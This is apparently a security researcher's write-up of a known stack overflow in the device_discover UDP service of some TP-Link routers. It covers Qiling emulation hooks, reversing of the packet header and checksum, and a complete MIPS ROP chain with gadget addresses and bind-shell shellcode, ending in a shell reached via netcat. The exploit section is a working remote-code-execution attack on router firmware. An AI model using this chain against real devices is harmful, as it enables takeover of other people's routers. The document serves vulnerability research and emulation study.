[TOC]

# summary 

I discovered this vulnerability but then found this already published by other researcher. 

Here just recorded the emulation by qiling.



`Device_discover` is a server in some TP-Link routers.

device_discover listen port 5001 and process received data. 

In data processing function `protocol_packet_handle` exist some checking function, checking method is based on the comparison of magic numbers of the data header and  checksum.

Structure of data header and algorithm of checksum can get by reverse engeerning.

In protocol parse function `parse_discovery_frame`, `parse_advertisement_frame` ,will call `parse_msg_element` to parse data.  And `parse_msg_element` will then call `copy_msg_element` .

Function `copy_msg_element`  lack of length validation and result in stack overflow.

```c
int __fastcall copy_msg_element(int a1, void *a2, signed int a3)
{
  if ( !a1 || !a2 || a3 < 0 )
    return 1;
  memcpy(a2, (const void *)(a1 + 4), a3);
  return 0;
}
```



# qiling



Some point need hook:

- device_discover will bind `br0`, here can patch the data or add a virtial interface at device 

  - patch 

    ```python
    ql.patch(0x0040BAC0, b'lo\x00')
    ```

  - add br0

    ```shell
    sudo modprobe dummy
    sudo ip link add br0 type dummy
    sudo ip addr change dev br0 192.168.100.1
    sudo ip link set dev br0 up 
    ```

- init_sock failed at `setsockopt(sockfd1, 0xFFFF, 25, optval, 0x20u)` , can hook the function 

  ```
  [x] 	Can't convert emu_optname 25 to host platform based optname
  [=] 	setsockopt(sockfd = 0x3, level = 0xffff, optname = 0x19, optval_addr = 0x7ff3cd7c, optlen = 0x20) = -0x1 (EPERM)
  
  
  device_discover binding interface:lo.
  [init_sock:377]: bind interface error.
  ```

  ```python
  def my_setsockopt(ql: Qiling):
      print("[+] Hooked setsockopt")
  
  ql.os.set_api('setsockopt', my_setsockopt, QL_INTERCEPT.CALL)
  ```

- jump to parse function `packet_handle` after `init_sock`

  ```
  def hook_to_packet_handle(ql: Qiling):
      ql.arch.regs.write("pc", 0x00403978)
  
  after_initrsock_addr = 0x004038E8
  ql.hook_address(hook_to_packet_handle,after_initrsock_addr)
  ```

- hijack ioctl ,bypass the following check logic.

  ```
  if ( ioctl(a1, 0x8915u, a2) >= 0 )
  {
  	...
  	v15 = protocol_handler(a1, &bbuf_for_main, &v26);
  
  }
  ```

  ```
  def my_ioctl(ql: Qiling):
      print("[+] Hijacked ioctl")
      return 0
  
  ql.os.set_api('ioctl', my_ioctl,QL_INTERCEPT.CALL)
  ```

- hook `common_timer`

  common_timer will process some packet sending about broadcast data, and lead to PermissionError about sendto, here just bypass it.

  ```c
  common_timer()
  { 
    ...
    send_discovery_frame(g_para, &bbuf_for_bcast);
    ...
  }
  
  ```

  ```python
  def hook_common_timer(ql: Qiling):
      ql.arch.regs.write("v0",0x1)
  to_common_timer =  0x00403488
  ql.hook_address(hook_common_timer,to_common_timer)
  ```

  or just hijack `sendto` function

  ```python
  def my_sendto(ql: Qiling):
      return 0
  ql.os.set_api('sendto', my_sendto,QL_INTERCEPT.CALL)
  
  ```



After above steps, the emulation about `device_discover` almost done, device will open udp port 5001 ,and then processing received data.

```
> lsof -i:5001                         
COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
python3 381302 chiba    3u  IPv4 638722      0t0  UDP localhost:5001


[+] 	bind(3,127.0.0.1:5001,16) = 0
[+] 	syscall bind host: 127.[+] 	recvfrom() CONTENT:
[+] 	b'aaaaaaaaaa\n'
[+] 	recvfrom() addr is 127.0.0.1:496260.0.1 and port: 5001 sin_family: 2
```



## exp

### reverse protocol structure



At first ,check some magic number.

```c
 if ( !data || !a3 )
    return 1;
  if ( *data != 1 )
    return -1;
  v5 = data[1];
  v6 = v5 == 0;
  v7 = v5 < 3;
  if ( v6 )
    return -1;
  v6 = !v7;
  result = -1;
  if ( !v6 )
  {
    result = -1;
    if ( data[2] == 0xE )
    {
      v8 = data[11] | (data[10] << 8);
      result = -1;
      if ( v8 < 0x5C1 )
      {
        result = -1;
        if ( *((_DWORD *)data + 1) == 0xE12B83C7 )
```

The probable structure, tmp_chksum and tmp_len need update by the old data.

```
	 	header = "01010e00e12b83c7"
    tmp_chksum = "0000"
    tmp_len = 0
    padding = "0000"
    
    tlv data 
    
```

data checksum

```c
 if ( *((_DWORD *)data + 1) == 0xE12B83C7 )
        {
          data_len = tlv_data_len + 14;
          ptr = data;
          left_len = data_len;
          sum = 0;
          v13 = 0;
          do
          {
            v13 += 2;
            sum += *(unsigned __int16 *)ptr;
            ptr += 2;
            left_len -= 2;
          }
          while ( (int)(data_len - v13) >= 2 );
          v14 = HIWORD(sum);
          if ( left_len != 1 )
            goto LABEL_18;
          for ( sum += *ptr; ; sum = (unsigned __int16)sum + v14 )
          {
            v14 = HIWORD(sum);
LABEL_18:
            if ( !v14 )
              break;
          }
          if ( (unsigned __int16)sum == 0xFFFF )
            return ms_idle_handler(a1, data, 1, a3);
```



above "do while" and "for"  is the chksum logic code.

```c
def csum(data):
    chksum_temp = 0
    data_list = [data[i:i+4] for i in range(0, len(data), 4 ) ]
    for data in data_list:
        chksum_temp += int(data, 16)
    hiword_chksumm, loword_chksum = divmod(chksum_temp, 0x10000)
    chksum_temp = hiword_chksumm+loword_chksum
    chksum_fin = hex(chksum_temp ^ 0xffff)
    return chksum_fin
```



### generate ROP chain

- ra offset 

  use `cyclic` in pwntools

  ```
  payload = cyclic(1000, n=4) 
  
  pwndbg> i r ra
  ra: 0x79616166 ('yaaf')
  
  In [5]: cyclic_find("yaaf",n=4)
  Out[5]: 596
  ```

​		offset : 596 

- gadaget 1

  Find instruction pass value to ` $a0`

  ```
  Python>mipsrop.find("li $a0,1")
  ---------------------------------------------
  |  Address     |  Action   |  Control Jump   |
  ---------------------------------------------
  |  0x000512C0  |  li $a0,1     |  jalr  $s1  |
  ...
  ```

  Value of `$ra ` is : 000512C0 + base addr

  ```
  .text:000512C0                 li      $a0, 1
  .text:000512C4                 move    $t9, $s1
  .text:000512C8                 jalr    $t9 ; sub_50FC0
  ```

- gadaget 2

  since `$s1` can control , the second gadget run sleep function, but for the next gadget ,we need control `$ra`

  ```
  Python>mipsrop.tail()
  ---------------------------------------------
  |  Address     |  Action   |  Control Jump   |
  ---------------------------------------------
  |  0x00035348  |  move $t9,$s2    |  jr    $s2 
  ...
  ```

  Value of `$ra` is from stack, `$s2` is also in control.

  ```
  .text:00035348                 move    $t9, $s2
  .text:0003534C                 lw      $ra, 0x18+var_sC($sp)
  .text:00035350                 lw      $s2, 0x18+var_s8($sp)
  .text:00035354                 lw      $s1, 0x18+var_s4($sp)
  .text:00035358                 lw      $s0, 0x18+var_s0($sp)
  .text:0003535C                 jr      $t9 ; 
  ```

  pass sleep function addr 000500F0 + base addr to `$s2`

  

- gadagt 3

  We executed sleep and control the new `$ra`, so need some instruction get the value from stack.

  ```
  Python>mipsrop.stackfinder()
  ---------------------------------------------
  |  Address     |  Action   |  Control Jump   |
  ---------------------------------------------
  |  0x000305B0  |  addiu $s3,$sp,0x30+var_18 |  jalr  $s4
  ...
  ```

	value of `$s3 `  get from stack, is the address of shellcode , alse `$s4` is in control.
	
	```
	.text:000305B0                 addiu   $s3, $sp, 0x30+var_18
	.text:000305B4                 move    $a0, $s3
	.text:000305B8                 move    $t9, $s4
	.text:000305BC                 jalr    $t9 ; 
	.text:000305C0                 move    $a1, $s1
	```

- gadget 4

  `$s3` is the shellcode address, so `$s4 `  need execute `$s3`

  ```
  Python>mipsrop.find("move $t9, $s3")
  ---------------------------------------------
  |  Address     |  Action   |  Control Jump   |
  ---------------------------------------------
  |  0x0000B5F0  |  move $t9,$s3  |  jalr  $s3 
  ...
  ```

  ```
  .text:0000B5F0                 move    $t9, $s3
  .text:0000B5F4                 jalr    $t9
  .text:0000B5F8                 move    $a1, $s0
  ```

  `$s4` value is 0x000B5F0 + base addr

- gadget chain

  ```python
  shellcode = asm(shellcraft.mips.linux.bindsh(2334))
  libc_addr = 0x90063000
  addr1 =  0x000512C0
  addr2 = 0x00035348
  addr_sleep = 0x000500F0
  addr3 = 0x000305B0
  addr4 = 0x0000B5F0
  s1 = p32(libc_addr + addr2 )
  s2 = p32(libc_addr + addr_sleep)
  s3 = b"BBBB"
  s4 = p32(libc_addr + addr4)
  ra = p32(libc_addr+addr1)
  
  payload = b"A"*580 + s1 + s2 + s3 + s4 + ra + b"A"*36 + p32(libc_addr+addr3)+ b"D"*24+shellcode
  ```

### result

Meeting some problems like `unicorn.unicorn.UcError: Invalid memory write (UC_ERR_WRITE_UNMAPPED)`,  and ignored by using pwndbg.

Executed shellcode:

```shell
[+] 	bind(5,127.0.0.1:2334,16) = 0
[+] 	syscall bind host: 127.0.0.1 and port: 2334 sin_family: 2
...
[+] 	write() CONTENT: b'ls'
[+] 	write() CONTENT: b'Permission denied'


> lsof -i:2334                                                                                         
COMMAND    PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
python3 417496 chiba   13u  IPv4 695587      0t0  TCP localhost:2334 (LISTEN)
python3 417496 chiba   14u  IPv4 695588      0t0  TCP localhost:2334->localhost:43394 (ESTABLISHED)


$ nc 127.0.0.1 2334                                                                             exit 130
ls
sh: ls: Permission denied
pwd
/
help

Built-in commands:
-------------------
	. : alias bg break cd chdir continue eval exec exit export false
	fg hash help jobs kill let local pwd read readonly return set
	shift times trap true type ulimit umask unalias unset wait
```







# AFL mode

Tryed with qiling afl++ unicorn mode, but since there is some magic number check  and chksum mechanism, so it's hard to find deep path,  afl++ custom mutators maybe useful. 

```
AFL_AUTORESUME=1  afl-fuzz -i afl_inputs -o afl_outputs -U -- python3 ql_afl_main.py @@


             american fuzzy lop ++4.03c {default} (python3) [fast]
┌─ process timing ────────────────────────────────────┬─ overall results ────┐
│        run time : 0 days, 0 hrs, 0 min, 24 sec      │  cycles done : 0     │
│   last new find : none seen yet                     │ corpus count : 6     │
│last saved crash : none seen yet                     │saved crashes : 0     │
│ last saved hang : none seen yet                     │  saved hangs : 0     │
├─ cycle progress ─────────────────────┬─ map coverage┴──────────────────────┤
│  now processing : 1.1 (16.7%)        │    map density : 0.02% / 0.02%      │
│  runs timed out : 0 (0.00%)          │ count coverage : 1.00 bits/tuple    │
├─ stage progress ─────────────────────┼─ findings in depth ─────────────────┤
│  now trying : havoc                  │ favored items : 6 (100.00%)         │
│ stage execs : 1304/1766 (73.84%)     │  new edges on : 6 (100.00%)         │
│ total execs : 10.3k                  │ total crashes : 0 (0 saved)         │
│  exec speed : 408.9/sec              │  total tmouts : 0 (0 saved)         │
├─ fuzzing strategy yields ────────────┴─────────────┬─ item geometry ───────┤
│   bit flips : disabled (default, enable with -D)   │    levels : 1         │
│  byte flips : disabled (default, enable with -D)   │   pending : 0         │
│ arithmetics : disabled (default, enable with -D)   │  pend fav : 0         │
│  known ints : disabled (default, enable with -D)   │ own finds : 5         │
│  dictionary : n/a                                  │  imported : 0         │
│havoc/splice : 0/1664, 0/0                          │ stability : 100.00%   │
│py/custom/rq : unused, unused, unused, unused       ├───────────────────────┘
│    trim/eff : 50.00%/5, disabled                   │          [cpu000: 12%]
└────────────────────────────────────────────────────┘

```





Referer:

https://github.com/77clearlove/TP-Link-poc

[https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon%20Yang%20-%20Advanced%20SOHO%20Router%20Exploitation.pdf](https://gsec.hitb.org/materials/sg2015/whitepapers/Lyon Yang - Advanced SOHO Router Exploitation.pdf)



